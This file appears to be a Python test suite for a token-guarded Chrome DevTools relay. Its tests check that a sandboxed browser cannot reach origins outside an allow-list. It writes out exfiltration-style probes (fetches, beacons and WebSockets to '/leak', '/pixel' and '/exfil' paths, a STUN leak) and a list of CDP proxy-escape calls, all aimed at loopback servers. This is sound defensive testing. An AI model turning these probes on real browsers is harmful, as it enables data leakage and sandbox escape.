"""The shadow browser's DevTools: a pipe only, reached through a relay that
refuses anything without the run's token. Headless; localhost only."""

from __future__ import annotations

import json
import socket
import urllib.error
import urllib.request

import pytest

from openadapt_flow.readiness.cdp_wire import CdpError, CdpWire, browser_ws_url
from openadapt_flow.readiness.devtools_relay import DevToolsRelay, headless_shell


@pytest.fixture(scope="module")
def relay():
    pytest.importorskip("playwright")
    from playwright.sync_api import sync_playwright

    with sync_playwright() as pw:
        exe = headless_shell(pw.chromium.executable_path)
    try:
        started = DevToolsRelay(exe).start()
    except OSError as exc:
        pytest.skip(f"chromium unavailable: {exc}")
    yield started
    started.close()


def _status(url: str) -> int:
    try:
        with urllib.request.urlopen(url, timeout=5) as resp:  # noqa: S310 - loopback
            return resp.status
    except urllib.error.HTTPError as exc:
        return exc.code


def _upgrade(relay: DevToolsRelay, path: str) -> bytes:
    import base64
    import os

    nonce = base64.b64encode(os.urandom(16)).decode()  # a fresh WebSocket nonce
    with socket.create_connection(("127.0.0.1", relay.port), timeout=5) as sock:
        sock.sendall(
            f"GET {path} HTTP/1.1\r\nHost: 127.0.0.1\r\nUpgrade: websocket\r\n"
            f"Connection: Upgrade\r\nSec-WebSocket-Key: {nonce}\r\n"
            "Sec-WebSocket-Version: 13\r\n\r\n".encode()
        )
        return sock.recv(200)


def test_the_browser_has_no_tcp_debugging_port(relay: DevToolsRelay) -> None:
    args = " ".join(relay.proc.args)
    assert "--remote-debugging-pipe" in args and "--remote-debugging-port" not in args


def test_without_the_token_everything_is_refused(relay: DevToolsRelay) -> None:
    base = f"http://127.0.0.1:{relay.port}"
    assert _status(base + "/json/version") == 403
    assert _status(base + "/wrong/json/version") == 403
    assert _status(base + f"/{relay.token}x/json/version") == 403  # a longer token
    assert _status(base + f"/{relay.token[:-1]}/json/version") == 403
    assert b" 403 " in _upgrade(relay, "/devtools/browser")
    assert b" 403 " in _upgrade(relay, "/nottoken/devtools/browser")
    assert _status(relay.http_url + "/json/version") == 200
    assert b" 101 " in _upgrade(relay, f"/{relay.token}/devtools/browser")


def test_with_the_token_a_client_drives_the_browser(relay: DevToolsRelay) -> None:
    ws = browser_ws_url(relay.http_url)
    assert relay.token in ws
    events: list[str] = []
    wire = CdpWire(ws, lambda method, params, session: events.append(method))
    try:
        target = wire.send("Target.createTarget", {"url": "about:blank"})["targetId"]
        session = wire.send(
            "Target.attachToTarget", {"targetId": target, "flatten": True}
        )["sessionId"]
        out = wire.send("Runtime.evaluate", {"expression": "6*7"}, session_id=session)
        assert out["result"]["value"] == 42
        # Another client can't use this client's session.
        other = CdpWire(ws, lambda *a: None)
        try:
            with pytest.raises(CdpError):
                other.send("Runtime.evaluate", {"expression": "1"}, session_id=session)
        finally:
            other.close()
    finally:
        wire.close()


def test_playwright_connects_with_the_token(relay: DevToolsRelay) -> None:
    from playwright.sync_api import sync_playwright

    with sync_playwright() as pw:
        browser = pw.chromium.connect_over_cdp(relay.http_url)
        context = browser.new_context()
        page = context.new_page()
        page.set_content("<p id=x>ok</p>")
        assert page.text_content("#x") == "ok"
        context.close()
        browser.close()
    with sync_playwright() as pw:
        with pytest.raises(Exception):  # noqa: B017 - any refusal
            pw.chromium.connect_over_cdp(f"http://127.0.0.1:{relay.port}", timeout=5000)
    assert (
        json.loads(
            urllib.request.urlopen(  # noqa: S310
                relay.http_url + "/json/version", timeout=5
            ).read()
        )["webSocketDebuggerUrl"]
        == relay.ws_url
    )


def _server(body: bytes):
    import threading
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

    hits: list[str] = []

    class Handler(BaseHTTPRequestHandler):
        def log_message(self, *a) -> None:
            pass

        def do_GET(self) -> None:  # noqa: N802
            hits.append(self.path)
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(body)

    httpd = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    return httpd, hits


def test_the_browser_reaches_the_app_and_nothing_else() -> None:
    pytest.importorskip("playwright")
    from playwright.sync_api import sync_playwright

    app, app_hits = _server(b"<h1 id=app>app</h1>")
    other, other_hits = _server(b"other")
    app_origin = f"http://127.0.0.1:{app.server_address[1]}"
    other_origin = f"http://127.0.0.1:{other.server_address[1]}"
    with sync_playwright() as pw:
        exe = headless_shell(pw.chromium.executable_path)
        relay = DevToolsRelay(exe, allowed_origins=(app_origin,)).start()
        try:
            assert relay.network_limited
            browser = pw.chromium.connect_over_cdp(relay.http_url)
            page = browser.new_context().new_page()
            page.goto(app_origin + "/")
            assert page.text_content("#app") == "app"
            assert (
                page.evaluate(
                    f"fetch({json.dumps(app_origin + '/again')}).then(r => r.status, e => 'failed')"
                )
                == 200
            )
            got = page.evaluate(
                f"fetch({json.dumps(other_origin + '/leak?d=1')}, {{mode: 'no-cors'}})"
                ".then(() => 'answered', () => 'failed')"
            )
            public = page.evaluate(
                "fetch('http://192.0.2.1/leak', {mode: 'no-cors'})"
                ".then(() => 'answered', () => 'failed')"
            )
            ws = page.evaluate(
                f"""new Promise(done => {{
                    const s = new WebSocket({json.dumps("ws://127.0.0.1:" + str(other.server_address[1]) + "/ws")});
                    s.onopen = () => done('open'); s.onerror = () => done('failed');
                    setTimeout(() => done('timeout'), 20000);
                }})"""
            )
            image = page.evaluate(
                f"""new Promise(done => {{
                    const i = new Image(); i.onload = () => done('loaded');
                    i.onerror = () => done('failed');
                    i.src = {json.dumps(other_origin + "/pixel?d=1")};
                }})"""
            )
            browser.close()
        finally:
            relay.close()
    app.shutdown()
    other.shutdown()
    assert other_hits == [], other_hits
    assert (got, public, ws, image) == ("failed", "failed", "failed", "failed")
    assert "/again" in app_hits


def test_a_new_context_cannot_take_its_own_proxy() -> None:
    """Reviewer probe: ``Target.createBrowserContext`` with ``proxyServer:
    "direct://"`` through the relay escaped the browser's proxy limit."""

    pytest.importorskip("playwright")
    from playwright.sync_api import sync_playwright

    app, _ = _server(b"<h1>app</h1>")
    other, other_hits = _server(b"other")
    app_origin = f"http://127.0.0.1:{app.server_address[1]}"
    other_origin = f"http://127.0.0.1:{other.server_address[1]}"
    with sync_playwright() as pw:
        relay = DevToolsRelay(
            headless_shell(pw.chromium.executable_path), allowed_origins=(app_origin,)
        ).start()
        try:
            wire = CdpWire(browser_ws_url(relay.http_url), lambda *a: None)
            for params in (
                {"proxyServer": "direct://"},
                {"proxyBypassList": "*"},
                {"originsWithUniversalNetworkAccess": [other_origin]},
                {"someFutureKey": True},
            ):
                with pytest.raises(CdpError, match="refused"):
                    wire.send("Target.createBrowserContext", params)
            for method in (
                "Network.loadNetworkResource",
                "Target.exposeDevToolsProtocol",
                "Browser.executeBrowserCommand",
            ):
                with pytest.raises(CdpError, match="refused"):
                    wire.send(method, {})
            ctx = wire.send("Target.createBrowserContext", {"disposeOnDetach": True})
            wire.send(
                "Target.createTarget",
                {
                    "url": other_origin + "/exfil?d=1",
                    "browserContextId": ctx["browserContextId"],
                },
            )
            import time

            time.sleep(2)
            wire.close()
        finally:
            relay.close()
    app.shutdown()
    other.shutdown()
    assert other_hits == []


def _lan_ip() -> str:
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        try:
            s.connect(("192.0.2.1", 9))  # no packet is sent for a UDP connect
            return s.getsockname()[0]
        except OSError:
            return "127.0.0.1"


def _stun_probe(block_webrtc: bool) -> bool:
    """Whether a page's WebRTC ICE gathering sends a UDP packet to a local
    STUN listener."""

    from playwright.sync_api import sync_playwright

    app, _ = _server(b"<h1>app</h1>")
    app_origin = f"http://127.0.0.1:{app.server_address[1]}"
    udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp.bind(("0.0.0.0", 0))
    udp.settimeout(6)
    try:
        with sync_playwright() as pw:
            relay = DevToolsRelay(
                headless_shell(pw.chromium.executable_path),
                allowed_origins=(app_origin,),
                block_webrtc=block_webrtc,
            ).start()
            try:
                browser = pw.chromium.connect_over_cdp(relay.http_url)
                page = browser.new_context().new_page()
                page.goto(app_origin + "/")
                page.evaluate(
                    """(u) => { const pc = new RTCPeerConnection({iceServers: [{urls: u}]});
                    pc.createDataChannel('x');
                    pc.createOffer().then(o => pc.setLocalDescription(o)); window._pc = pc; }""",
                    f"stun:{_lan_ip()}:{udp.getsockname()[1]}",
                )
                try:
                    udp.recvfrom(2048)
                    return True
                except socket.timeout:
                    return False
                finally:
                    browser.close()
            finally:
                relay.close()
    finally:
        udp.close()
        app.shutdown()


def test_webrtc_sends_no_udp_past_the_proxy() -> None:
    """Reviewer probe: WebRTC's STUN packets went around the HTTP proxy."""

    pytest.importorskip("playwright")
    if not _stun_probe(block_webrtc=False):
        pytest.skip("no STUN packet arrives here even without the block")
    assert _stun_probe(block_webrtc=True) is False
